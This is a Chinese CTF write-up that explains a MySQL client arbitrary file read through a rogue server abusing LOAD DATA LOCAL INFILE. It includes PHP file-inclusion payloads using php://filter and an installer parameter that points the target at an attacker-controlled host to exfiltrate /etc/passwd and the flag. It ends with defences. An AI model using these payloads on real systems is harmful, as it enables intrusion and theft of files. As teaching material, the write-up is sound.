> 原文链接: https://www.anquanke.com//post/id/173039 


# 从一道ctf题学习mysql任意文件读取漏洞


                                阅读量   
                                **443333**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01b1e772cc15b2cc16.png)](https://p1.ssl.qhimg.com/t01b1e772cc15b2cc16.png)



## 题目分析

题目给出了源码

```
&lt;?php

define(ROBOTS, 0);
error_reporting(0);

if(empty($_GET["action"])) `{`
    show_source(__FILE__);
`}` else `{`
    include $_GET["action"].".php";
`}`

```

可以文件包含，但是被添加了`.php`后缀。尝试%00截断、超长字符串截断均不成功。

注意到第一句代码，变量名为ROBOTS,联想到robots.txt。

访问后发现目录

```
User-agent:*

Disallow:/install
Disallow:/admin
```

分别用php伪协议包含admin/index和install/index，payload为

> [http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=admin/index](http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=admin/index)<br>[http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=install/index](http://ctf.chaffee.cc:23333/?action=php://filter/read=convert.base64-encode/resource=install/index)

得到admin/index.php，得到了flag的路径。

```
&lt;?php


if (!defined("ROBOTS")) `{`die("Access Denied");`}`


echo "Congratulate hack to here, But flag in /var/www/flag.flag";

```

install/index.php

```
&lt;?php


if(file_exists("./install.lock")) `{`
    die("Have installed!");
`}`


$host = $_REQUEST['host'];
$user = $_REQUEST['user'];
$passwd = $_REQUEST['passwd'];
$database = $_REQUEST['database'];


if(!empty($host) &amp;&amp; !empty($user) &amp;&amp; !empty($passwd) &amp;&amp; !empty($database)) `{`
    $conn = new mysqli($host, $user, $passwd);
    if($conn-&gt;connect_error) `{`
        die($conn-&gt;connect_error);
    `}` else `{`
        $conn-&gt;query("DROP DATABASE ".$database);
        $conn-&gt;query("CREATE DATABASE ".$database);
        //To be continued
        mysqli_close($conn);


        $config = "&lt;?phpn$config=";
        $config .= var_export(array("host"=&gt;$host, "user"=&gt;$user, "passwd"=&gt;$passwd), TRUE).";";
        file_put_contents(md5($_SERVER["REMOTE_ADDR"])."/config.php", $config);
    `}`
`}`

```

该文件首先判断当前目录有无install.lock，我们通过上一级目录的文件包含漏洞可以绕过这个判断。下面是接受用户输入登陆mysql数据库，登陆成功的话会执行两个没有任何过滤的SQL语句，然后执行一个文件写入的操作。

我在做这道题时第一反应是爆破数据库，进入下面的else语句里，写入代码到config.php执行，但是发现如果直接输入对应的参数，即`host=localhost&amp;user=root&amp;passwd=root&amp;database=era`,这样会报`No such file or directory`的错误。分析原因，的确成功登入数据库，但是在执行`file_put_contents()`函数时，插入了一个文件夹`md5($_SERVER["REMOTE_ADDR"])`，而这个函数在文件夹不存在的情况下是不能新建文件夹的，因此这个`file_put_contents()`函数并不能利用，我觉得这像是出题人的一个陷阱。那真正的利用点在哪呢？



## 漏洞回顾

首先回顾一下去年爆出的[phpmyadmin任意文件读取漏洞](http://aq.mk/index.php/archives/23/)。

如果phpmyadmin开启了如下选项

```
$cfg['AllowArbitraryServer'] = true; //false改为true
```

则登录时就可以访问远程的服务器。当登陆一个恶意构造的Mysql服务器时，即可利用`load data infile`读取该服务器上的任意文件。当然前提条件是`secure_file_priv`参数允许的目录下，且phpmyadmin的用户对该文件有读的权限。

这里利用[vulnspy](https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/)上的实验环境演示分析该漏洞。

首先是配置恶意服务器。在db服务器的命令行里修改root/exp/rogue_mysql_server.py文件，设port为3306外的其他端口，我这里设为3307，然后在filelist中选择一个要读取的文件。

[![](https://s2.ax1x.com/2019/03/11/ACMhxx.png)](https://s2.ax1x.com/2019/03/11/ACMhxx.png)

运行这个python脚本，可以看到服务器已经开始监听这个端口

[![](https://s2.ax1x.com/2019/03/11/ACQjk4.md.png)](https://imgchr.com/i/ACQjk4)

访问phpMyAdmin的登录页面，地址输入db:3307、用户名vulnspy、密码vulnspy，提交登录。

[![](https://s2.ax1x.com/2019/03/11/AClVtH.png)](https://s2.ax1x.com/2019/03/11/AClVtH.png)

在db的命令行里可以看到，文件访问已经成功。

[![](https://s2.ax1x.com/2019/03/11/ACllB8.md.png)](https://imgchr.com/i/ACllB8)



## 漏洞分析

漏洞出在`Load data infile`语法。在mysql客户端登陆mysql服务端后，客户端执行语句

```
Load data local infile '/etc/passwd' into table proc;
```

这里使用的是`load data local infile`，不加local是读取服务器的文件，添加local参数为读取本地文件。

[![](https://s2.ax1x.com/2019/03/11/ACUuge.md.png)](https://imgchr.com/i/ACUuge)

即意为客户端本地的`/etc/passwd`文件插入了服务器的test表中。

服务器此时会回复一个包含了`/etc/passwd`的`Response TABULAR`包。

[![](https://s2.ax1x.com/2019/03/11/ACUlDA.md.png)](https://imgchr.com/i/ACUlDA)

[![](https://s2.ax1x.com/2019/03/11/ACU0Ds.md.png)](https://imgchr.com/i/ACU0Ds)

接着客户端就回复给服务端本地`/etc/passwd`中的内容。

[![](https://s2.ax1x.com/2019/03/11/ACUoUx.md.png)](https://imgchr.com/i/ACUoUx)

正常的请求逻辑如下

```
sequenceDiagram
客户端-&gt;&gt;服务端: Load data infile '/etc/passwd'... 
服务端-&gt;&gt;客户端: Response TABULAR
客户端-&gt;&gt;服务端: Content in /etc/passwd
```

这是正常的情况，即客户端发送一个`load data infile` 请求，服务器回复一个`Response TABULAR`，不会出现什么问题。<br>
但是Mysql允许服务端在任何时候发送`Response TABULAR`数据包， 此时就跳过了第一步，实现了任意文件读取的目的。

```
sequenceDiagram
客户端-&gt;&gt;服务端: 
服务端-&gt;&gt;客户端: Response TABULAR
客户端-&gt;&gt;服务端: Content in /etc/passwd
```

恶意mysql服务器只需要完成mysql连接的握手包，然后发送出这个`Response TABULAR`包，即可收到客户端传来的文件。

在刚才的phpmyadmin实例里抓包，可以看到该恶意服务端发包和客户端发送数据的包内容。

[![](https://s2.ax1x.com/2019/03/11/ACsJ10.md.png)](https://imgchr.com/i/ACsJ10)

这里给出github上的[恶意mysql服务器地址](https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py)。

这就是整个漏洞的分析过程，最后回到开始那道ctf题，答案也是显而易见了。在vps上开启一个恶意mysql服务器并监听。然后在浏览器输入payload

```
host=VPS_ADDR:EVIL-MYSQL_PORT&amp;user=root&amp;passwd=root&amp;database=ddd
```

即可在服务器的mysql.log里看到flag

[![](https://s2.ax1x.com/2019/03/11/ACsT3t.md.png)](https://imgchr.com/i/ACsT3t)



## 漏洞防御
- 关闭`local_infile`参数，禁止导入本地文件
- 开启`--ssl-mode=VERIFY_IDENTITY`参数，防止连接不安全的mysql服务器。


## 参考文档
- [https://lightless.me/archives/read-mysql-client-file.html#_label5](https://lightless.me/archives/read-mysql-client-file.html#_label5)
- [https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html](https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html)
- [https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/](https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/)